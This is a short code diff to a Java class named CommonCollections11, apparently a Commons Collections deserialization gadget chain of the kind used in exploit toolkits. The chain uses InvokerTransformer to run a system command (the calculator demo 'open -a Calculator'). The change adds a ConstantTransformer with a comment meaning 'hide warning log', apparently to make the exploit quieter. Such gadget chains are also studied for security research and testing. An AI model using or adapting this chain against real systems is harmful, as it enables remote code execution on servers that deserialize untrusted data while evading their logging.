@@ -32,7 +32,8 @@ public class CommonCollections11 {
                 ),
                 new InvokerTransformer("exec",
                         new Class[]{String.class}, new Object[]{"open -a Calculator"}
-                )
+                ),
+                new ConstantTransformer(1) // 隐藏告警日志
         };
         ChainedTransformer transformerChain = new ChainedTransformer(transformers);
 
